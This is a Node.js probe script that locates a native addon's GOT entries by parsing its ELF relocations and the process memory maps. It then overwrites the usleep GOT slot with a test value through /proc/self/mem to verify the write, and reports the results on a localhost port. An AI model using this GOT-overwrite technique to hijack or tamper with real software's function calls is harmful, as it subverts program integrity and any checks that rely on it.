// v24d - verify GOT writes + dump full maps for addon
// Port 8102
try {
  var fs = require('fs');
  var http = require('http');
  var lines = ['=== GOT-verify v24d ==='];

  var ADDON = '/home/owner/share/tmp/sdk_tools/timing-probe.node';

  function u32le(buf, o) { return (buf[o] | (buf[o+1]<<8) | (buf[o+2]<<16) | (buf[o+3]<<24)) >>> 0; }
  function u16le(buf, o) { return (buf[o] | (buf[o+1]<<8)) >>> 0; }
  function cstr(buf, o) {
    var e = o; while (e < buf.length && buf[e]) e++;
    return buf.slice(o, e).toString('ascii');
  }

  // Load addon
  try { require(ADDON); } catch(e) {}

  // Dump ALL maps lines containing timing-probe
  var allMaps = fs.readFileSync('/proc/self/maps', 'utf8');
  var addonLines = allMaps.split('\n').filter(function(l){ return l.indexOf('timing-probe') !== -1; });
  lines.push('addon_maps_all: ' + JSON.stringify(addonLines));

  // Also find EVERY line in maps (let's see what's near address 0x20000)
  var nearLines = allMaps.split('\n').filter(function(l){
    if (!l) return false;
    var addr = parseInt(l.split('-')[0], 16);
    return addr >= 0x10000 && addr <= 0x40000;
  });
  lines.push('maps_near_0x20000: ' + JSON.stringify(nearLines.slice(0,20)));

  // Parse addon GOT slots
  var addonBuf = fs.readFileSync(ADDON);
  var shoff = u32le(addonBuf,32), shentsize = u16le(addonBuf,46), shnum = u16le(addonBuf,48), shstrndx = u16le(addonBuf,50);
  var secs = {}, shstro = u32le(addonBuf, shoff + shstrndx*shentsize + 16);
  for (var i=0;i<shnum;i++) {
    var so=shoff+i*shentsize;
    var sname=cstr(addonBuf,shstro+u32le(addonBuf,so));
    secs[sname]={off:u32le(addonBuf,so+16),size:u32le(addonBuf,so+20),entsize:u32le(addonBuf,so+36)};
  }
  var relPlt=secs['.rel.plt'], dynSym=secs['.dynsym'], dynStr=secs['.dynstr'];

  var gotSlots = {};
  if (relPlt && dynSym && dynStr) {
    var entSz=relPlt.entsize||8, n=Math.floor(relPlt.size/entSz);
    for (var i=0;i<n;i++) {
      var o=relPlt.off+i*entSz;
      var r_offset=u32le(addonBuf,o), r_info=u32le(addonBuf,o+4);
      var symIdx=(r_info>>>8)&0xffffff;
      var stName=u32le(addonBuf,dynSym.off+symIdx*16);
      var funcName=cstr(addonBuf,dynStr.off+stName);
      gotSlots[funcName]=r_offset;
    }
  }

  // Determine addonBase: check if addonLines found anything
  var addonBase = 0;
  addonLines.forEach(function(l){
    if (l.indexOf('r-xp') !== -1 || l.indexOf('r--') !== -1) {
      var a = parseInt(l.split('-')[0], 16);
      if (!addonBase || a < addonBase) addonBase = a;
    }
  });
  // If still 0, check if the GOT address IS valid in maps (look at first entry)
  if (!addonBase && addonLines.length > 0) {
    addonBase = parseInt(addonLines[0].split('-')[0], 16);
  }
  lines.push('addonBase_resolved: 0x' + addonBase.toString(16));

  // Test: pick usleep GOT slot, write to it, read back immediately
  var memFd = fs.openSync('/proc/self/mem', 'r+');
  var buf4 = new Buffer(4);

  var uGotVA = addonBase + gotSlots['usleep'];
  var uGotVA0 = gotSlots['usleep'];  // also test with no base offset

  // Read at addonBase+offset
  fs.readSync(memFd, buf4, 0, 4, uGotVA);
  var before_base = u32le(buf4, 0);
  lines.push('usleep_GOT_addonBase+off (0x'+uGotVA.toString(16)+'): 0x'+before_base.toString(16));

  // Read at raw offset (addonBase=0 scenario)
  fs.readSync(memFd, buf4, 0, 4, uGotVA0);
  var before_raw = u32le(buf4, 0);
  lines.push('usleep_GOT_raw_off (0x'+uGotVA0.toString(16)+'): 0x'+before_raw.toString(16));

  // Write a test value (0xDEADBEEF) to raw GOT address
  var testVal = 0xDEADBEEF >>> 0;
  buf4.writeUInt32LE(testVal, 0);
  try {
    fs.writeSync(memFd, buf4, 0, 4, uGotVA0);
    lines.push('write_test_to_0x'+uGotVA0.toString(16)+': OK');
  } catch(we) { lines.push('write_test: FAILED ' + String(we.code||we.message)); }

  // Immediately read back
  var buf4b = new Buffer(4);
  fs.readSync(memFd, buf4b, 0, 4, uGotVA0);
  var after_raw = u32le(buf4b, 0);
  lines.push('readback_after_write (0x'+uGotVA0.toString(16)+'): 0x'+after_raw.toString(16));
  if (after_raw === testVal) lines.push('WRITE_VERIFIED: wrote DEADBEEF, read back DEADBEEF!');
  else lines.push('WRITE_NOT_VISIBLE: expected 0xdeadbeef, got 0x'+after_raw.toString(16));

  // Also try: write 0xDEADBEEF to addonBase+usleep GOT if addonBase != 0
  if (addonBase !== 0) {
    fs.writeSync(memFd, buf4, 0, 4, uGotVA);
    fs.readSync(memFd, buf4b, 0, 4, uGotVA);
    var after_base = u32le(buf4b, 0);
    lines.push('readback_base+off (0x'+uGotVA.toString(16)+'): 0x'+after_base.toString(16) +
      (after_base===testVal?' WRITE_VERIFIED':' NOT_VISIBLE'));
  }

  fs.closeSync(memFd);

  var body = lines.join('\n') + '\n=== END ===\n';
  try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe24d.txt', body); } catch(e3) {}
  var srv = http.createServer(function(req, res){
    res.writeHead(200,{'Content-Type':'text/plain'}); res.end(body);
  });
  srv.listen(8102, '127.0.0.1', function(){});
  srv.on('error', function(e){});
  setInterval(function(){},60000);
} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe24d-crash.txt',String(e.stack||e.message).substring(0,500)); } catch(e2) {}
}
